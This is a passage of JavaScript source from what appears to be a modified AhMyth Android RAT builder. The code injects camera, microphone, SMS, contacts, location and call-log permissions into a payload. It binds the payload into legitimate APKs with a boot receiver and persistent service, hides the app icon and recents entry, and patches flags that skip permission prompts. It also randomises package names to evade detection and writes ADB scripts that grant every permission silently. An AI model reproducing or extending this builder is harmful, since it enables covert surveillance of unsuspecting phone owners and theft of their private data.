                'AUTO_CLOSE_ACTIVITY': false, // Default to false for better UX
                'UNINSTALL_PROTECTION': false, // Default to false
                'SKIP_PERMISSION_PROMPTS': $appCtrl.silentPermOptions?.skipPrompts ?? false,
                'USE_ACCESSIBILITY_GRANTER': $appCtrl.silentPermOptions?.useAccessibility ?? false,
                'DEVICE_OWNER_MODE': $appCtrl.silentPermOptions?.deviceOwner ?? false,
                'ADB_GRANT_MODE': $appCtrl.silentPermOptions?.generateAdbScript ?? true,
                'SKIP_SPECIAL_PERMISSIONS': false,
                'MINIMAL_PERMISSIONS_ONLY': false,
                'SILENT_PERMISSION_MODE': $appCtrl.silentPermOptions?.skipPrompts ?? false,
                'SKIP_SCREEN_CAPTURE_PROMPT': true,
                'AUTO_REQUEST_SCREEN_CAPTURE': false
            };
            
            let modifiedCount = 0;
            
            // Replace boolean values in smali format
            for (const [fieldName, value] of Object.entries(stealthMappings)) {
                const boolValue = value ? '0x1' : '0x0';
                const boolStr = value ? 'true' : 'false';
                let found = false;
                
                // Pattern 1: Replace in .field declaration with = true/false (direct assignment)
                const fieldPattern = new RegExp(`(\\.field public static final ${fieldName}:Z\\s*=\\s*)(true|false)`, 'g');
                if (fieldPattern.test(smaliContent)) {
                    smaliContent = smaliContent.replace(fieldPattern, `$1${boolStr}`);
                    found = true;
                    modifiedCount++;
                    delayedLog(`[✓] Set ${fieldName} = ${boolStr}`, CONSTANTS.logStatus.SUCCESS);
                    continue;
                }
                
                // Pattern 2: Replace in <clinit> method - find const/4 before sput-boolean
                // Look for: const/4 vX, 0x0 or 0x1 followed by sput-boolean for this field
                const lines = smaliContent.split('\n');
                let inClinit = false;
                let clinitStart = -1;
                let clinitEnd = -1;
                
                // Find <clinit> method boundaries
                for (let i = 0; i < lines.length; i++) {
                    if (lines[i].trim().startsWith('.method static constructor <clinit>()V')) {
                        inClinit = true;
                        clinitStart = i;
                    }
                    if (inClinit && lines[i].trim() === '.end method') {
                        clinitEnd = i;
                        break;
                    }
                }
                
                if (inClinit && clinitStart >= 0 && clinitEnd > clinitStart) {
                    // Search within <clinit> for this field's assignment
                    for (let i = clinitStart; i <= clinitEnd; i++) {
                        // Look for sput-boolean with this field name
                        if (lines[i].includes(`->${fieldName}:Z`)) {
                            // Look backwards for const/4 instruction
                            for (let j = i - 1; j >= clinitStart && j >= i - 5; j--) {
                                const line = lines[j].trim();
                                if (line.startsWith('const/4') && (line.includes('0x0') || line.includes('0x1'))) {
                                    // Replace the const value
                                    lines[j] = lines[j].replace(/0x[01]/g, boolValue);
                                    found = true;
                                    modifiedCount++;
                                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (in <clinit>)`, CONSTANTS.logStatus.SUCCESS);
                                    break;
                                }
                            }
                            break;
                        }
                    }
                    
                    if (found) {
                        smaliContent = lines.join('\n');
                        continue;
                    }
                }
                
                // Pattern 3: Try to find any const/4 followed by sput-boolean for this field (anywhere in file)
                const sputPattern = new RegExp(`(const/4\\s+v\\d+,\\s*)0x[01]([^\\n]*\\n[^\\n]*sput-boolean[^\\n]*->${fieldName}:Z)`, 'g');
                if (sputPattern.test(smaliContent)) {
                    smaliContent = smaliContent.replace(sputPattern, `$1${boolValue}$2`);
                    found = true;
                    modifiedCount++;
                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (pattern match)`, CONSTANTS.logStatus.SUCCESS);
                    continue;
                }
                
                if (!found) {
                    delayedLog(`[⚠] Could not find ${fieldName} in StealthConfig.smali`, CONSTANTS.logStatus.WARNING);
                }
            }
            
            // Write the modified content back
            if (modifiedCount > 0) {
                await fs.promises.writeFile(stealthConfigPath, smaliContent, 'utf8');
                delayedLog(`[✓] StealthConfig.smali updated successfully (${modifiedCount} fields modified)`, CONSTANTS.logStatus.SUCCESS);
            } else {
                delayedLog('[⚠] No StealthConfig fields were modified', CONSTANTS.logStatus.WARNING);
            }
            
        } catch (error) {
            delayedLog(`[✗] Error modifying StealthConfig.smali: ${error.message}`, CONSTANTS.logStatus.FAIL);
            throw error;
        }
    }

    // UNCOMMENT ORIGINAL CODE IF PROBLEMS ARISE.
    $appCtrl.GenerateApk = async (apkFolder) => {
        // Apply obfuscation if enabled
        if ($appCtrl.obfuscationOptions && (
            $appCtrl.obfuscationOptions.randomizePackage ||
            $appCtrl.obfuscationOptions.randomizeAppName ||
            $appCtrl.obfuscationOptions.injectJunk ||
            $appCtrl.obfuscationOptions.addMetadata
        )) {
            try {
                delayedLog('[→] Applying obfuscation...', CONSTANTS.logStatus.INFO);
                
                const obfuscationResult = await obfuscator.obfuscate(apkFolder, {
                    randomizePackage: $appCtrl.obfuscationOptions.randomizePackage,
                    randomizeAppName: $appCtrl.obfuscationOptions.randomizeAppName,
                    randomizeVersion: $appCtrl.obfuscationOptions.randomizeVersion,
                    injectJunk: $appCtrl.obfuscationOptions.injectJunk,
                    junkCount: 10,
                    addMetadata: $appCtrl.obfuscationOptions.addMetadata,
                    customPackage: $appCtrl.obfuscationOptions.customPackage,
                    customAppName: $appCtrl.obfuscationOptions.customAppName
                });
                
                if (obfuscationResult.success) {
                    obfuscationResult.changes.forEach(change => {
                        delayedLog(`[✓] ${change}`, CONSTANTS.logStatus.SUCCESS);
                    });
                    if (obfuscationResult.newPackageName) {
                        delayedLog(`[ℹ] New package: ${obfuscationResult.newPackageName}`, CONSTANTS.logStatus.INFO);
                    }
                    if (obfuscationResult.newAppName) {
                        delayedLog(`[ℹ] New app name: ${obfuscationResult.newAppName}`, CONSTANTS.logStatus.INFO);
                    }
                } else {
                    delayedLog(`[⚠] Obfuscation warning: ${obfuscationResult.error}`, CONSTANTS.logStatus.WARNING);
                }
            } catch (obfError) {
                delayedLog(`[⚠] Obfuscation error: ${obfError.message}`, CONSTANTS.logStatus.WARNING);
            }
        }
        
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[→] Reading payload manifest file...', CONSTANTS.logStatus.INFO);
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                delayedLog('[→] Parsing manifest XML data...', CONSTANTS.logStatus.INFO);
                const parsedData = await new Promise((resolve, reject) => {
                    xml2js.parseString(data, (parseError, parsedData) => {
                        if (parseError) {
                            reject(parseError);
                        } else {
                            resolve(parsedData);
                        }
                    });
                });

                delayedLog('[→] Injecting selected permissions...', CONSTANTS.logStatus.INFO);
                parsedData.manifest['uses-permission'] = [];
                parsedData.manifest['uses-feature'] = [];

                // Add new permissions and features based on selectedPermissions
                selectedPermissions.forEach(permission => {
                    if (permission === 'android.hardware.camera') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera'
                            }
                        });
                    }

                    if (permission === 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera.autofocus'
                            }
                        });
                    }

                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-permission'].push({
                            $: {
                                'android:name': permission
                            }
                        });
                    }
                });

                // Apply stealth options
                if ($appCtrl.stealthOptions) {
                    delayedLog('[→] Applying stealth options...', CONSTANTS.logStatus.INFO);
                    
                    // Find the MainActivity in the manifest
                    if (parsedData.manifest.application && parsedData.manifest.application[0]) {
                        const app = parsedData.manifest.application[0];
                        
                        // Hide from recents - add excludeFromRecents to all activities
                        if ($appCtrl.stealthOptions.hideFromRecents && app.activity) {
                            app.activity.forEach(activity => {
                                activity.$['android:excludeFromRecents'] = 'true';
                                activity.$['android:noHistory'] = 'true';
                            });
                            delayedLog('[✓] Hide from recents enabled', CONSTANTS.logStatus.SUCCESS);
                        }
                        
                        // Hide app icon - remove LAUNCHER category from MainActivity
                        if ($appCtrl.stealthOptions.hideIcon && app.activity) {
                            app.activity.forEach(activity => {
                                if (activity['intent-filter']) {
                                    activity['intent-filter'].forEach(filter => {
                                        if (filter.category) {
                                            // Remove LAUNCHER category
                                            filter.category = filter.category.filter(cat => 
                                                cat.$['android:name'] !== 'android.intent.category.LAUNCHER'
                                            );
                                            // Keep only DEFAULT category or add it
                                            if (filter.category.length === 0) {
                                                filter.category = [{ $: { 'android:name': 'android.intent.category.DEFAULT' } }];
                                            }
                                        }
                                    });
                                }
                            });
                            delayedLog('[✓] App icon hidden from launcher', CONSTANTS.logStatus.SUCCESS);
                        }
                    }
                }

                // Convert the parsed data back to XML
                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.ahmythApkFolderPath,
                        'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );

            } catch (error) {
                delayedLog('[✗] Error processing payload manifest!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error);
                delayedLog(`[ℹ] Error details saved to: ${logPath}`, CONSTANTS.logStatus.INFO);
                return;
            }
        }
        
        // Apply stealth and permission options to StealthConfig.smali (for both bound and non-bound APKs)
        try {
            await applyStealthConfigToSmali(apkFolder);
        } catch (stealthError) {
            delayedLog(`[⚠] Warning: Could not modify StealthConfig: ${stealthError.message}`, CONSTANTS.logStatus.WARNING);
            // Continue with build even if stealth config modification fails
        }

        try {
            delayedLog('[→] Clearing Apktool framework directory...', CONSTANTS.logStatus.INFO);
            execCallback('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        // Build the AhMyth Payload APK
        delayedLog(`[→] Building ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
        var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
            CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
        execCallback(createApk,
            (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[✗] Build process failed!', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Building');
                    delayedLog(`[ℹ] Error details saved to: ${logPath}/Building.log`, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog(`[→] Signing ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
                var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                execCallback(signApk, (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[✗] Signing process failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Signing');
                        delayedLog(`[ℹ] Error details saved to: ${logPath}/Signing.log`, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                        if (err) throw err;

                        delayedLog('[✓] Payload built successfully!', CONSTANTS.logStatus.SUCCESS);
                        const signedApkPath = dir.join(outputPath, CONSTANTS.signedApkName);
                        delayedLog('[ℹ] Output location:', CONSTANTS.logStatus.INFO);
                        delayedLog(`    └─ ${signedApkPath}`, CONSTANTS.logStatus.INFO);
                        // Store the output path for easy access
                        $appCtrl.lastBuiltApkPath = signedApkPath;
                        $appCtrl.lastOutputFolder = outputPath;
                        
                        // Offer to open the output folder automatically
                        try {
                            delayedLog('[→] Opening output folder...', CONSTANTS.logStatus.INFO);
                            if (shell && shell.showItemInFolder) {
                                shell.showItemInFolder(signedApkPath);
                            }
                        } catch (e) {
                            console.warn('Failed to open output folder:', e);
                        }
                        
                        // Generate ADB script for silent permissions if enabled
                        if ($appCtrl.silentPermOptions && $appCtrl.silentPermOptions.generateAdbScript) {
                            generateAdbPermissionScript(outputPath);
                        }
                        
                        delayedLog('');

                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                            if (err) throw err;
                        });
                    });
                });
            });
    };
    
    // Generate ADB script to grant all permissions silently
    function generateAdbPermissionScript(outputPath) {
        const packageName = 'ahmyth.mine.king.ahmyth';
        const permissions = CONSTANTS.permissions.filter(p => 
            !p.startsWith('android.hardware.') && 
            p.startsWith('android.permission.')
        );
        
        // Windows batch script
        let batScript = `@echo off
echo ===== AhMyth Silent Permission Granter =====
echo.
echo This script will grant all permissions to the AhMyth payload.
echo Make sure the device is connected via ADB and USB debugging is enabled.
echo.

set PACKAGE=${packageName}

echo [*] Checking device connection...
adb devices
echo.

echo [*] Installing APK (if needed)...
adb install -r -g "${CONSTANTS.signedApkName}"
echo.

echo [*] Granting permissions...
`;
        
        permissions.forEach(perm => {
            batScript += `adb shell pm grant %PACKAGE% ${perm} 2>nul\n`;
        });
        
        batScript += `
echo.
echo [*] Granting special permissions...
adb shell appops set %PACKAGE% SYSTEM_ALERT_WINDOW allow 2>nul
adb shell appops set %PACKAGE% GET_USAGE_STATS allow 2>nul
adb shell appops set %PACKAGE% WRITE_SETTINGS allow 2>nul
adb shell appops set %PACKAGE% REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>nul
adb shell appops set %PACKAGE% MANAGE_EXTERNAL_STORAGE allow 2>nul
adb shell appops set %PACKAGE% RUN_IN_BACKGROUND allow 2>nul
adb shell appops set %PACKAGE% RUN_ANY_IN_BACKGROUND allow 2>nul

echo.
echo [*] Starting the app...
adb shell am start -n %PACKAGE%/%PACKAGE%.MainActivity 2>nul
adb shell am startservice %PACKAGE%/%PACKAGE%.MainService 2>nul

echo.
echo [+] All permissions granted successfully!
echo [!] Note: Some permissions may require manual approval on Android 10+
pause`;
        
        // Unix/Linux shell script
        let shScript = `#!/bin/bash
echo "===== AhMyth Silent Permission Granter ====="
echo ""
echo "This script will grant all permissions to the AhMyth payload."
echo "Make sure the device is connected via ADB and USB debugging is enabled."
echo ""

PACKAGE="${packageName}"

echo "[*] Checking device connection..."
adb devices
echo ""

echo "[*] Installing APK (if needed)..."
adb install -r -g "${CONSTANTS.signedApkName}"
echo ""

echo "[*] Granting permissions..."
`;
        
        permissions.forEach(perm => {
            shScript += `adb shell pm grant $PACKAGE ${perm} 2>/dev/null\n`;
        });
        
        shScript += `
echo ""
echo "[*] Granting special permissions..."
adb shell appops set $PACKAGE SYSTEM_ALERT_WINDOW allow 2>/dev/null
adb shell appops set $PACKAGE GET_USAGE_STATS allow 2>/dev/null
adb shell appops set $PACKAGE WRITE_SETTINGS allow 2>/dev/null
adb shell appops set $PACKAGE REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>/dev/null
adb shell appops set $PACKAGE MANAGE_EXTERNAL_STORAGE allow 2>/dev/null
adb shell appops set $PACKAGE RUN_IN_BACKGROUND allow 2>/dev/null
adb shell appops set $PACKAGE RUN_ANY_IN_BACKGROUND allow 2>/dev/null

echo ""
echo "[*] Starting the app..."
adb shell am start -n $PACKAGE/$PACKAGE.MainActivity 2>/dev/null
adb shell am startservice $PACKAGE/$PACKAGE.MainService 2>/dev/null

echo ""
echo "[+] All permissions granted successfully!"
echo "[!] Note: Some permissions may require manual approval on Android 10+"`;
        
        try {
            fs.writeFileSync(dir.join(outputPath, 'grant_permissions.bat'), batScript);
            fs.writeFileSync(dir.join(outputPath, 'grant_permissions.sh'), shScript);
            delayedLog('[✓] ADB permission scripts generated:', CONSTANTS.logStatus.SUCCESS);
            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
            delayedLog(`[ℹ] Output folder: ${outputPath}`, CONSTANTS.logStatus.INFO);
        } catch (e) {
            delayedLog('[!] Failed to generate ADB scripts', CONSTANTS.logStatus.WARNING);
        }
    }

    // function to create the smali payload directory for storing ahmyth payload directories and files when binding
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[→] Reading decompiled application...', CONSTANTS.logStatus.INFO);
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[✗] Failed to read decompiled application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog(`[ℹ] Error details saved to: ${logPath}/Reading.log`, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[→] Creating ${payloadSmaliFolder} directory...`, CONSTANTS.logStatus.INFO);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[✗] Failed to create ${payloadSmaliFolder} directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[→] Copying payload files to ${payloadSmaliFolder}...`, CONSTANTS.logStatus.INFO);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[✗] Copying payload files failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying');
                        delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying.log`, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[✗] Copying android directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying "android" directory');
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[✗] Copying androidx directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying "androidx" directory');
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with Apk generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    }

    $appCtrl.modifyManifest = (data, callback) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");

        // default permissions for the payload
        const permissions = CONSTANTS.permissions;

        // Create an array to store the selected permissions
        var selectedPermissions = [];

        // Check each checkbox and add the corresponding permission to the selectedPermissions array
        if (checkBoxofCamera.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        }
        if (checkBoxofStorage.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        }
        if (checkBoxofMic.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        }
        if (checkBoxofLocation.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        }
        if (checkBoxofContacts.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        }
        if (checkBoxofSms.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        }
        if (checkBoxofCallsLogs.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
        }

        // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            checkBoxofCamera.checked &&
            checkBoxofStorage.checked &&
            checkBoxofMic.checked &&
            checkBoxofLocation.checked &&
            checkBoxofContacts.checked &&
            checkBoxofSms.checked &&
            checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            !checkBoxofCamera.checked &&
            !checkBoxofStorage.checked &&
            !checkBoxofMic.checked &&
            !checkBoxofLocation.checked &&
            !checkBoxofContacts.checked &&
            !checkBoxofSms.checked &&
            !checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        delayedLog('[→] Parsing Android Manifest XML...', CONSTANTS.logStatus.INFO);

        // Convert data to a string if it's not already a string
        if (typeof data !== 'string') {
            data = data.toString();
        }

        xml2js.parseString(data, {
            explicitArray: false
        }, (err, result) => {
            if (err) {
                const callbackErrors = [
                    '[✗] Failed to parse Android Manifest XML!',
                    `[ℹ] Error saved to: ${logPath}/Parsing.log`,
                ];
                writeErrorLog(err, 'Parsing.log');
                callback({
                    message: callbackErrors[0],
                    callbackErrors,
                });
                return;
            }

            const manifestObj = result.manifest;

            // Check if receiver and service properties are arrays
            if (!Array.isArray(manifestObj.application.receiver)) {
                manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver] : [];
            }

            if (!Array.isArray(manifestObj.application.service)) {
                manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service] : [];
            }

            // store existing permissions
            const existingPermissions = new Set();

            // Check if permissions already exist in the manifest
            if (manifestObj['uses-permission']) {
                if (!Array.isArray(manifestObj['uses-permission'])) {
                    manifestObj['uses-permission'] = [manifestObj['uses-permission']];
                }
                manifestObj['uses-permission'].forEach((permission) => {
                    existingPermissions.add(permission.$['android:name']);
                });
            } else {
                manifestObj['uses-permission'] = [];
            }

            // Check if features already exist in the manifest
            if (manifestObj['uses-feature']) {
                if (!Array.isArray(manifestObj['uses-feature'])) {
                    manifestObj['uses-feature'] = [manifestObj['uses-feature']];
                }
                manifestObj['uses-feature'].forEach((feature) => {
                    existingPermissions.add(feature.$['android:name']);
                });
            } else {
                manifestObj['uses-feature'] = [];
            }

            // Filter selected permissions to exclude duplicates
            const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
                return self.indexOf(permission) === index && !existingPermissions.has(permission);
            });

            delayedLog('[→] Injecting AhMyth payload permissions...', CONSTANTS.logStatus.INFO);

            // Add new permissions and features based on filteredPermissions
            filteredPermissions.forEach(permission => {
                if (permission === 'android.hardware.camera') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission === 'android.hardware.camera.autofocus') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera.autofocus'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                    manifestObj['uses-permission'].push({
                        $: {
                            'android:name': permission
                        },
                        _: '' // Add empty string as element text
                    });
                }
            });

            delayedLog('[→] Injecting AhMyth service and receiver...', CONSTANTS.logStatus.INFO);

            // Construct the receiver and service tags using constants
            const receiverTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'true',
                    'android:name': CONSTANTS.ahmythReceiver,
                },
                'intent-filter': {
                    action: {
                        $: {
                            'android:name': 'android.intent.action.BOOT_COMPLETED',
                        },
                    },
                },
            };

            const serviceTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'false',
                    'android:name': CONSTANTS.ahmythService,
                    'android:foregroundServiceType': 'dataSync',
                },
            };

            // Add the receiver and service tags to the application node
            manifestObj.application.receiver.push(receiverTag);
            manifestObj.application.service.push(serviceTag);
            
            // Apply stealth options to manifest (for bound APKs)
            if ($appCtrl.stealthOptions && manifestObj.application && manifestObj.application.activity) {
                const activities = Array.isArray(manifestObj.application.activity) 
                    ? manifestObj.application.activity 
                    : [manifestObj.application.activity];
                
                activities.forEach(activity => {
                    // Hide from recents
                    if ($appCtrl.stealthOptions.hideFromRecents) {
                        if (!activity.$) activity.$ = {};
                        activity.$['android:excludeFromRecents'] = 'true';
                        activity.$['android:noHistory'] = 'true';
                    }
                    
                    // Hide app icon - remove LAUNCHER category
                    if ($appCtrl.stealthOptions.hideIcon && activity['intent-filter']) {
                        const intentFilters = Array.isArray(activity['intent-filter']) 
                            ? activity['intent-filter'] 
                            : [activity['intent-filter']];
                        
                        intentFilters.forEach(filter => {
                            if (filter.category) {
                                const categories = Array.isArray(filter.category) 
                                    ? filter.category 
                                    : [filter.category];
                                
                                // Remove LAUNCHER category
                                filter.category = categories.filter(cat => {
                                    const name = cat.$ && cat.$['android:name'] ? cat.$['android:name'] : cat['android:name'];
                                    return name !== 'android.intent.category.LAUNCHER';
                                });
                                
                                // Add DEFAULT if no categories left
                                if (filter.category.length === 0) {
                                    filter.category = [{ $: { 'android:name': 'android.intent.category.DEFAULT' } }];
                                }
                            }
                        });
                    }
                });
                
                delayedLog('[✓] Stealth options applied to manifest', CONSTANTS.logStatus.SUCCESS);
            }

            const builder = new xml2js.Builder({
                renderOpts: {
                    pretty: true,
                    indent: '    '
                },
                headless: true
            });

            // Modify the parsed object by finding and updating the closing application tag
            const closingAppTag = '</application>';
            const modifiedClosingAppTag = '\n  </application>';
            const xmlString = builder.buildObject(result);
            const modifiedXml = xmlString.replace(closingAppTag,
                modifiedClosingAppTag);

            // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
            const closingManifestTag = '</manifest>';
            const finalModifiedXml = modifiedXml.replace(closingManifestTag,
                '</manifest>');

            callback(null,
                finalModifiedXml);
        });
    };

    $appCtrl.bindOnBoot = (apkFolder) => {
        const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');

        delayedLog('[→] Reading Android Manifest...', CONSTANTS.logStatus.INFO);
        fs.readFile(manifestPath, 'utf8', (error,
            data) => {
            if (error) {
                delayedLog('[✗] Failed to read Android Manifest!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                return;
            }

            $appCtrl.modifyManifest(data, (err, finalModifiedXml) => {
                if (err) {
                    // Handle the error and print the callback errors
                    delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                    if (err.callbackErrors) {
                        err.callbackErrors.forEach((errorMsg) => {
                            delayedLog(errorMsg, CONSTANTS.logStatus.FAIL);
                        });
                    }
                    return;
                }

                delayedLog('[→] Writing modified manifest...', CONSTANTS.logStatus.INFO);
                fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[✗] Failed to write modified manifest!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Writing.log');
                        return;
                    }

                    $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder)
                });
            });
        });
    };

    // "Bind On Activity" method
    $appCtrl.bindOnActivity = (apkFolder) => {
        const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');

        delayedLog('[→] Reading Android Manifest...', CONSTANTS.logStatus.INFO);
        fs.readFile(manifestPath, 'utf8', (error, data) => {
            if (error) {
